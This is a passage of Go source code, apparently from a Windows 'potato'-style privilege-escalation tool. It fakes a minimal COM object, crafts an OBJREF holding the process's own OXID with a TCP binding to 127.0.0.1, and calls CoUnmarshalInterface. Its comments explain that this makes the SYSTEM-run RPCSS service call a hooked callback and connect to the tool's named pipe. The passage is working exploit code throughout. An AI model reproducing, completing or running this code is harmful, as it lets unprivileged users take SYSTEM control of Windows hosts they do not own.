			// else (especially IMarshal!) so COM uses standard OXID marshaling.
			// If we return S_OK for IMarshal, COM tries to call IMarshal methods
			// on our 3-entry IUnknown vtable, reading garbage and hanging.
			qiid := unsafe.Slice((*byte)(unsafe.Pointer(riid)), 16)
			isIUnknown := true
			for i := 0; i < 16; i++ {
				if qiid[i] != iidIUnknown[i] {
					isIUnknown = false
					break
				}
			}
			if isIUnknown {
				*(*uintptr)(unsafe.Pointer(ppv)) = this
				return 0 // S_OK
			}
			*(*uintptr)(unsafe.Pointer(ppv)) = 0
			return 0x80004002 // E_NOINTERFACE
		}),
		AddRef: syscall.NewCallback(func(this uintptr) uintptr {
			return 1
		}),
		Release: syscall.NewCallback(func(this uintptr) uintptr {
			return 0
		}),
	}

	// The COM object is just a pointer to its vtable pointer
	obj := &struct{ vtbl *iunknownVtbl }{vtbl: vtbl}

	// Store reference in potatoGlobal to prevent GC from collecting the object.
	// Without this, converting to uintptr removes the only Go reference, and
	// the GC could free the object while COM still holds a native pointer to it.
	potatoGlobal.iunknownRef = obj

	return uintptr(unsafe.Pointer(obj))
}

// comRelease calls IUnknown::Release on a COM interface pointer.
func comRelease(punk uintptr) {
	if punk == 0 {
		return
	}
	vtblPtr := *(*uintptr)(unsafe.Pointer(punk))
	releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
	syscall.SyscallN(releaseFunc, punk)
}

// triggerOXIDResolution constructs a crafted OBJREF with TCP bindings using
// the process's own OXID, and calls CoUnmarshalInterface to trigger OXID
// resolution through the hooked UseProtSeq callback.
func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
	// Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
	objref := buildCraftedOBJREF(oxid, oid, ipid)

	// Create IStream wrapping our OBJREF
	stream, streamRelease, err := createOBJREFStream(objref)
	if err != nil {
		return fmt.Errorf("create IStream: %w", err)
	}
	defer streamRelease()

	// Call CoUnmarshalInterface to trigger OXID resolution.
	// This causes COM to contact RPCSS to resolve the OXID.
	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
	// to register TCP. Our hook returns a pipe binding, and RPCSS (SYSTEM)
	// connects to our named pipe.
	var punk uintptr
	ret, _, _ := procCoUnmarshalIntf.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		uintptr(unsafe.Pointer(&punk)),
	)

	if punk != 0 {
		comRelease(punk)
	}

	// CoUnmarshalInterface may return an error (the object's bindings are fake),
	// but the side effect of triggering OXID resolution is what we want.
	// Return the HRESULT for diagnostic purposes.
	if ret != 0 {
		return fmt.Errorf("CoUnmarshalInterface hr=0x%08x", ret)
	}
	return nil
}

// buildCraftedOBJREF constructs a standard OBJREF with the process's own
// OXID/OID/IPID but with TCP bindings to 127.0.0.1. This forces RPCSS
// to call UseProtSeq because the process hasn't registered TCP yet.
func buildCraftedOBJREF(oxid [8]byte, oid [8]byte, ipid [16]byte) []byte {
	buf := make([]byte, 0, 256)

	// Signature ("MEOW")
	sig := make([]byte, 4)
	binary.LittleEndian.PutUint32(sig, objrefSignature)
	buf = append(buf, sig...)

	// Flags (OBJREF_STANDARD)
	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, objrefStandard)
	buf = append(buf, flags...)

	// IID (IID_IUnknown)
	buf = append(buf, iidIUnknown[:]...)

	// STDOBJREF.flags (4 bytes)
	stdobjFlags := make([]byte, 4)
	binary.LittleEndian.PutUint32(stdobjFlags, 0)
	buf = append(buf, stdobjFlags...)

	// STDOBJREF.cPublicRefs (4 bytes)
	pubRefs := make([]byte, 4)
	binary.LittleEndian.PutUint32(pubRefs, 1)
	buf = append(buf, pubRefs...)

	// STDOBJREF.oxid (8 bytes) — OUR process's OXID
	buf = append(buf, oxid[:]...)

	// STDOBJREF.oid (8 bytes) — OUR object's OID
	buf = append(buf, oid[:]...)

	// STDOBJREF.ipid (16 bytes) — OUR interface IPID
	buf = append(buf, ipid[:]...)

	// DUALSTRINGARRAY — TCP to 127.0.0.1 (forces UseProtSeq callback)
	dsArray := buildTCPDualStringArray()
	buf = append(buf, dsArray...)

	return buf
}

// buildTCPDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
// via TCP (tower 0x07). Since our process only registered ALPC (local),
// the TCP binding forces RPCSS to call UseProtSeq to ask us to register TCP.
func buildTCPDualStringArray() []byte {
	towerID := uint16(0x0007) // ncacn_ip_tcp
	addr := utf16Encode("127.0.0.1")

	stringBinding := make([]byte, 0, 32)
	tb := make([]byte, 2)
	binary.LittleEndian.PutUint16(tb, towerID)
	stringBinding = append(stringBinding, tb...)
	for _, c := range addr {
		cb := make([]byte, 2)
		binary.LittleEndian.PutUint16(cb, c)
		stringBinding = append(stringBinding, cb...)
	}
	stringBinding = append(stringBinding, 0, 0) // null terminator
	stringBinding = append(stringBinding, 0, 0) // end of string bindings

	stringEntries := len(stringBinding) / 2

	// Security binding
	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
	secEntries := len(secBinding) / 2

	totalEntries := stringEntries + secEntries

	result := make([]byte, 4+totalEntries*2)
	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
	copy(result[4:], stringBinding)
	copy(result[4+stringEntries*2:], secBinding)

	return result
}

func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
	// Use SHCreateMemStream from shlwapi.dll
	shlwapiDLL := windows.NewLazySystemDLL("shlwapi.dll")
	procSHCreateMemStream := shlwapiDLL.NewProc("SHCreateMemStream")

	if procSHCreateMemStream.Find() == nil {
		stream, _, err := procSHCreateMemStream.Call(
			uintptr(unsafe.Pointer(&objrefData[0])),
			uintptr(len(objrefData)),
		)
		if stream == 0 {
			return 0, nil, fmt.Errorf("SHCreateMemStream: %v", err)
		}

		release := func() {
			comRelease(stream)
		}

		return stream, release, nil
	}

	return 0, nil, fmt.Errorf("SHCreateMemStream not available")
}
